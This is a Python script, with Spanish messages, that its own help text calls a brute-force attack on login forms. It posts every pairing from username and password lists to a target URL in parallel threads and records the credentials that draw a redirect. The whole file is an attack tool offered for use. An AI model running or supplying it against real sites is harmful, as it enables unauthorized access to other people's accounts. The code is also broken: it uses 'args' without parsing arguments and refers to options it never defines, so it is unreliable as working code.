import requests
import argparse
import concurrent.futures

def brute_force_login(url, users_file, passwords_file, output_file, max_workers=10):
    with open(users_file, 'r') as users:
        usernames = users.readlines()

    with open(passwords_file, 'r') as passwords:
        pass_list = passwords.readlines()

    session = requests.Session()

    def check_credentials(user, password):
        data = {
            'username': user.strip(),
            'password': password.strip()
        }

        response = session.post(url, data=data, allow_redirects=False)

        if response.status_code == 302:
            result = f"[+] Credenciales encontradas: Usuario - {user}, Contraseña - {password}"
            print(result)
            return True, result
        return False, None

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for user in usernames:
            for password in pass_list:
                futures.append(executor.submit(check_credentials, user, password))

        for future in concurrent.futures.as_completed(futures):
            found, result = future.result()
            if found:
                with open(output_file, 'a') as f:
                    f.write(result + '\n')
                return  

    print("[-] No se encontraron credenciales válidas")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Script de fuerza bruta para ataque de inicio de sesión")
    parser.add_argument("url", help="URL del formulario de inicio de sesión")
    parser.add_argument("users_file", help="Ruta del archivo que contiene la lista de usuarios")
    parser.add_argument("passwords_file", help="Ruta del archivo que contiene la lista de contraseñas")

    brute_force_login(args.url, args.users_file, args.passwords_file, args.output_file, args.max_workers)
